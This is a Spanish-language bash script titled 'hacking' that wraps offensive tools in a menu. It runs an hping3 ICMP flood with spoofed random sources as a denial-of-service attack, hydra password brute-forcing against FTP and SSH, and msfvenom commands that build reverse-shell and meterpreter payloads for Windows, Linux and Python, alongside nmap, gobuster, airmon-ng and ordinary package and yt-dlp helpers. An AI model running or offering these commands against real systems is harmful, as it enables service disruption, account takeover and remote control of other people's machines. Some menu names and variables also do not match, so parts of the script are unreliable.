#!/bin/bash

# NOMBRE DEL SCRIPT: 'hacking'

# Imprimir variables.
rojo="\e[1;31m"
verde="\e[1;32m"
amarillo="\e[1;33m"
morado="\e[1;35m"
azul="\e[1;34m"
gris="\e[1;37m"
reset="\e[0m"

rojo_f="\e[1;41m"
azul_f="\e[1;44m"
verde_f="\e[1;42m"
amarillo_f="\e[1;43m"
morado_f="\e[1;45m"

USUARIO=$(whoami)

# Llamamos a esta funcion en trap finalizar SIGINT (en caso de que el usuario presione control + c para salir del script).
finalizar() {
    echo ""
    echo ""
    echo -e "${amarillo_f}Se interrumpio el script..${reset}"
    sleep 2
    exit
}

trap finalizar SIGINT

# Ejecutar el script.
echo ""
echo -e "${gris}${rojo_f}USUARIO:${reset} ${USUARIO}  ${gris}|  ${rojo_f}AUTOR:${reset} el_cero_placa"
echo ""
echo ""
echo -e "${gris}# Use el comando ${azul}help ${gris}para mostrar el menu de ayuda.${reset}"
echo -e "${gris}"
echo -n "command: "
read SELECCION
echo -e "${reset}"

if [ ${SELECCION} == "help" ]; then
       clear
       echo -e "${gris}"
       echo -e "${amarillo}# Panel de ayuda:${reset}"
       echo -e "${gris}"
       echo -e "        help              ${azul}----->  ${gris}(mostrar el menu de ayuda)"
       echo ""
       echo -e "  instalar-dependencias   ${azul}----->  ${gris}(instalar dependencias de la herramienta)"
       echo ""
       echo -e "      ataque-doss         ${azul}----->  ${gris}(enviar paquetes para sobrecargar una paguina web)"
       echo ""
       echo -e "      ataque-ftp          ${azul}----->  ${gris}(realizar fuerza bruta al protocolo ftp)"
       echo ""
       echo -e "      ataque-ssh          ${azul}----->  ${gris}(realizar fuerza bruta al protocolo ssh)"
       echo ""
       echo -e "   escaneo-servicios      ${azul}----->  ${gris}(analizar servicios de una direccion ip)"
       echo ""
       echo -e "     escaneo-web          ${azul}----->  ${gris}(obtener informacion de una paguina web)"
       echo ""
       echo -e "   servidor-python        ${azul}----->  ${gris}(levantar servidor python para compartir archivos en la red)"
       echo ""
       echo -e "   payload-windows        ${azul}----->  ${gris}(generar payload para windows)"
       echo ""
       echo -e "   payload-linux          ${azul}----->  ${gris}(generar payload para linux)"
       echo ""
       echo -e "   payload-python         ${azul}----->  ${gris}(generar payload para python)"
       echo ""
       echo -e "    download-mp4          ${azul}----->  ${gris}(descargar video de youtube)"
       echo ""
       echo -e "    download-mp3          ${azul}----->  ${gris}(descargar audio de youtube)"
       echo ""
       echo -e "   activar-monitor        ${azul}----->  ${gris}(habilitar interfaz en modo monitoreo)"
       echo ""
       echo -e "  desactivar-monitor      ${azul}----->  ${gris}(desactivar la interfaz modo monitor)"
       echo ""
       echo -e "  actualizar-terminal     ${azul}----->  ${gris}(actualizar la linea de comandos)"
       echo ""
       echo -e "  actualizar-paquetes     ${azul}----->  ${gris}(actualizar todos los paquetes del sistema)"
       echo ""
       echo -e "    remover-cache         ${azul}----->  ${gris}(eliminar basura cache)"
       echo ""
       echo -e "   instalar-paquete       ${azul}----->  ${gris}(instalar un paquete)"
       echo ""
       echo -e "   eliminar-paquete       ${azul}----->  ${gris}(eliminar un paquete)"
       echo ""
       echo -e " dispositivos-conectados  ${azul}----->  ${gris}(muestra los dispositivos conectados en la red)"
       echo ""
       echo -e "         ping             ${azul}----->  ${gris}(comprueba si hay coneccion con un equipo)"
       echo ""
       echo -e "       gobuster           ${azul}----->  ${gris}(buscar directorios ocultos dentro de una pagina web)"
       echo ""
       echo -e "         ${rojo}exit             ${rojo}----->  ${rojo}(salir de la herramienta)${reset}"
       echo -e "${reset}"
       exit

elif [ ${SELECCION} == "instalar-dependencias" ]; then
         clear
         echo ""
         echo -e "${verde}# Instalando dependencias..${reset}"
         echo ""
         sudo apt install metasploit-framework -y
         sudo apt install nmap -y
         sudo apt install gobuster -y
         sudo apt install hydra -y
         sudo apt install arp-scan -y
         sudo apt install aircrack-ng -y
         sudo apt install python3 -y
         sudo apt install whatweb -y
         sudo apt install hping3 -y
         sudo apt install yt-dlp -y
         echo ""
         echo -e "${azul}Dependencias instaladas.${reset}"
         echo ""
         echo -e "${amarillo}Ahora puede ejecutar la herramienta correctamente. ${gris}:)${reset}"
         exit

elif [ ${SELECCION} == "ping" ]; then
         echo -e "${gris}"
         echo -n "ip: "
         read IP
         echo ""
         echo -e "${verde}# Estos son los resultados del ping..${reset}"
         sleep 2
         echo -e "${morado}"
         sudo ping -c 1 ${IP}
         echo -e "${gris}"
         echo -e "${azul}REALIZADO.${reset}"
         sleep 2
         exit

elif [ ${SELECCION} == "dispositivos-conectados" ]; then
         echo -e "${gris}"
         echo -n "interfaz: "
         read INTERFAZ
         echo ""
         echo -e "${verde}# Estos son los dispositivos conectados en la red..${reset}"
         sleep 2
         echo -e "${rojo}"
         sudo arp-scan -I ${INTERFAZ} --localnet
         echo -e "${reset}"
         echo -e "${azul}FINALIZADO.${reset}"
         sleep 2
         exit

elif [ ${SELECCION} == "instalar-paquete" ]; then
         echo -e "${gris}"
         echo -n "nombre del paquete: "
         read NOMBRE_PAQUETE
         echo ""
         echo -e "${verde}# Instalando paquete..${reset}"
         sleep 2
         echo -e "${morado}"
         sudo apt install ${NOMBRE_PAQUETE} -y
         echo ""
         echo -e "${azul}INSTALADO.${reset}"
         sleep 2
         exit

elif [ ${SELECCION} == "gobuster" ]; then
         echo -e "${gris}"
         echo -n "url: "
         read URL
         echo ""
         echo -e "${amarillo}# Buscando directorios dentro de la pagina web..${reset}"
         sleep 2
         echo ""
         sudo gobuster dir -u ${URL} -w /diccionarios/directory-list-2.3-medium.txt
         echo -e "${morado}"
         echo -n "enter para finalizar."
         echo -e "${reset}"
         read PRESIONE_ENTER
         sleep 2
         exit

elif [ ${SELECCION} == "eliminar-paquete" ]; then
         echo -e "${gris}"
         echo -n "nombre del paquete: "
         read NOMBRE_PAQUETE
         echo ""
         echo -e "${verde}# eliminando paquete..${reset}"
         sleep 2
         echo -e "${morado}"
         sudo apt remove ${NOMBRE_PAQUETE} -y
         echo ""
         echo -e "${azul}ELIMINADO.${reset}"
         sleep 2
         exit

elif [ ${SELECCION} == "actualizar-terminal" ]; then
         echo -e ""
         echo -e "${verde}# Actualizando terminal..${reset}"
         echo -e "${morado}"
         sudo apt update
         echo ""
         echo -e "${azul}ACTUALIZADO.${reset}"
         sleep 2
         exit

elif [ ${SELECCION} == "actualizar-paquetes" ]; then
         echo ""
         echo -e "${verde}# Actualizando paquetes..${reset}"
         echo -e "${morado}"
         sudo apt upgrade -y
         echo ""
         echo -e "${azul}ACTUALIZADO.${reset}"
         sleep 2
         exit

elif [ ${SELECCION} == "remover-cache" ]; then
         echo ""
         echo -e "${verde}# Limpeando sistema..${reset}"
         echo -e "${morado}"
         sudo apt autoremove -y
         echo ""
         echo -e "${azul}CACHE ELIMINADO.${reset}"
         sleep 2
         exit

elif [ ${SELECCION} == "ataque-doss" ]; then
       echo -e "${gris}"
       echo -n "ip: "
       read IP
       echo ""
       echo -e "${rojo}# Ataque doss iniciado, Presione control + c para detener el ataque.${reset}"
       sleep 2
       echo -e "${morado}"
       sudo hping3 --icmp --rand-source --flood -d 1400 ${IP}
       echo ""
       echo -e "${azul}REALIZADO.${reset}"
       sleep 3
       exit

elif [ ${SELECCION} == "download-mp4" ]; then
         echo -e "${gris}"
         echo -n "url del video: "
         read URL
         echo ""
         echo -e "${verde}# Descargando video..${reset}"
         sleep 2
         echo -e "${morado}"
         yt-dlp ${URL}
         echo ""
         echo -e "${azul}DESCARGADO.${reset}"
         sleep 2
         exit

elif [ ${SELECCION} == "download-mp3" ]; then
         echo -e "${gris}"
         echo -n "url del audio: "
         read URL
         echo ""
         echo -e "${verde}# Descargando audio..${reset}"
         sleep 2
         echo -e "${morado}"
         yt-dlp --extract-audio --audio-format mp3 ${URL}
         echo ""
         echo -e "${azul}DESCARGADO.${reset}"
         sleep 2
         exit

elif [ ${SELECCION} == "activar-monitor" ]; then
         echo -e "${gris}"
         echo -n "interfaz: "
         read INTERFAZ
         echo ""
         echo -e "${amarillo}# Habilitando interfaz en modo monitor..${reset}"
         sleep 2
         echo -e "${morado}"
         sudo airmon-ng start ${INTERFAZ}
         echo ""
         echo -e "${azul}REALIZADO.${reset}"
         sleep 2
         exit

elif [ ${SELECCION} == "desactivar-monitor" ]; then
         echo -e "${gris}"
         echo -n "interfaz: "
         read INTERFAZ
         echo ""
         echo -e "${verde}# Desactivando modo monitor..${reset}"
         sleep 2
         echo -e "${morado}"
         sudo airmon-ng stop ${INTERFAZ}
         echo ""
         echo -e "${azul}REALIZADO.${reset}"
         sleep 2
         exit

elif [ ${SELECCION} == "payload-windows" ]; then
         echo -e "${gris}"
         echo -n "ip: "
         read IP
         echo -e "${gris}"
         echo -n "puerto: "
         read PUERTO
         echo -e "${amarillo}"
         echo -n "establecer nombre: "
         read FILE_PATH
         echo ""
         echo -e "${verde}# Generando payload windows..${reset}"
         sleep 2
         echo ""
         msfvenom -p windows/meterpreter/reverse_tcp LHOST=${ip} LPORT=${PUERTO} -f exe > ${FILE_PATH}.exe
         echo ""
         echo -e "${azul}REALIZADO.${reset}"
         sleep 2
         exit

elif [ ${SELECCION} == "payload-python" ]; then
         echo -e "${gris}"
         echo -n "ip: "
         read IP
         echo -e "${gris}"
         echo -n "puerto: "
         read PUERTO
         echo -e "${amarillo}"
         echo -n "establecer nombre: "
         read FILE_PATH
         echo ""
         echo -e "${verde}# Generando payload python..${reset}"
         sleep 2
         echo ""
         msfvenom -p python/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PUERTO} -o ${FILE_PATH}.py
         echo ""
         echo -e "${azul}REALIZADO.${reset}"
         sleep 2
         exit

elif [ ${SELECCION} == "payload-linux" ]; then
         echo -e "${gris}"
         echo -n "ip: "
         read IP
         echo -e "${gris}"
         echo -n "puerto: "
         read PUERTO
         echo -e "${amarillo}"
         echo -n "establecer nombre: "
         read FILE_PATH
         echo ""
         echo -e "${verde}# Generando payload linux..${reset}"
         sleep 2
         echo ""
         msfvenom -p linux/x86/shell_reverse_tcp lhost=${IP} lport=${PUERTO} --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out ${FILE_PATH}
         echo ""
         echo -e "${azul}REALIZADO.${reset}"
         sleep 2
         exit

elif [ ${SELECCION} == "ataque-ftp" ]; then
         echo -e "${gris}"
         echo -n "usuario: "
         read USUARIO
         echo -e "${gris}"
         echo -n "ip: "
         read IP
         echo ""
         echo -e "${verde}# Realizando ataque ftp..${reset}"
         echo -e ""
         sudo hydra -t 4 -l ${USUARIO} -P /diccionario/passwords.txt ftp://${IP}
         echo ""
         echo -e "${azul}REALIZADO.${reset}"
         sleep 2
         exit

elif [ ${SELECCION} == "ataque-ssh" ]; then
         echo -e "${gris}"
         echo -n "usuario: "
         read USUARIO
         echo -e "${gris}"
         echo -n "ip: "
         read IP
         echo ""
         echo -e "${verde}# Realizando ataque ssh..${reset}"
         echo -e ""
         sudo hydra -t 6 -l ${USUARIO} -P /diccionario/passwords.txt ssh://${IP}
         echo ""
         echo -e "${azul}REALIZADO.${reset}"
         sleep 2
         exit

elif [ ${SELECCION} == "escaneos-servicios" ]; then
         echo -e "${gris}"
         echo -n "ip: "
         read IP
         echo -e "${morado}"
         sudo nmap -sS -sC -sV --min-rate 5000 -Pn -n -vvv ${IP}
         echo ""
         echo -e "${azul}REALIZADO..${reset}"
         sleep 2
         exit

elif [ ${SELECCION} == "escaneo-web" ]; then
         echo -e "${gris}"
         echo -n "url: "
         read URL
         echo ""
         echo -e "${amarillo}# Obteniendo informacion de la paguina web..${reset}"
         echo ""
         whatweb ${URL}
         echo ""
         echo -e "${azul}REALIZADO.${reset}"
         sleep 2
         exit

elif [ ${SELECCION} == "servidor-python" ]; then
         echo -e "${gris}"
         echo -n "ip: "
         read IP
         echo -e "${gris}"
         echo -n "puerto: "
         read PUERTO
         echo ""
         echo -e "${amarillo}# Servidor python (INICIADO) Presione control + c para detener el servidor..${reset}"
         echo -e "${morado}"
         python3 -m http.server --bind ${IP} ${PUERTO}
         echo ""
         echo -e "${azul}CANCELADO.${reset}"
         sleep 2
         exit

elif [ ${SELECCION} == "exit" ]; then
         echo ""
         echo -e "${morado_f}Finalizado..${reset}"
         sleep 2
         exit

else
         echo "" && echo -e "${gris}No se encuentra en la linea de comandos. ${rojo}X${reset}" && echo ""
fi
